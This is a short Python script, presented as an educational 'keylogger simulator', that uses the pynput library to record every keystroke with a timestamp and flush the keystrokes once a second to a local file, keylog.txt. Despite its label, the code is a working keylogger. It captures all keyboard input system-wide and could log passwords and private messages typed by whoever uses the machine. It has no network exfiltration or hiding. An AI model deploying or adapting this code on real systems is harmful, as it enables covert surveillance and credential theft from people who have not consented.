# keylogger_simulator.py
# EDUCATIONAL USE ONLY - Keylogger Simulator for Cybersecurity Learning

from pynput import keyboard
import datetime
import os
import threading

log_file = "keylog.txt"
log_buffer = []
buffer_lock = threading.Lock()
flush_interval = 1  # Flush buffer to file every 1 second

# Create log file if it doesn't exist
if not os.path.exists(log_file):
    with open(log_file, "w", encoding="utf-8") as f:
        f.write("=== Keylogger Simulator Log - For Educational Use Only ===\n")

def flush_buffer():
    """Flush the log buffer to the file periodically."""
    global log_buffer
    with buffer_lock:
        if log_buffer:
            with open(log_file, "a", encoding="utf-8") as f:
                f.writelines(log_buffer)
            log_buffer = []
    threading.Timer(flush_interval, flush_buffer).start()

def on_press(key):
    try:
        log_entry = f"{datetime.datetime.now()} - {key.char}\n"
    except AttributeError:
        log_entry = f"{datetime.datetime.now()} - {key}\n"
    with buffer_lock:
        log_buffer.append(log_entry)

if __name__ == "__main__":
    flush_buffer()  # Start periodic flushing
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()
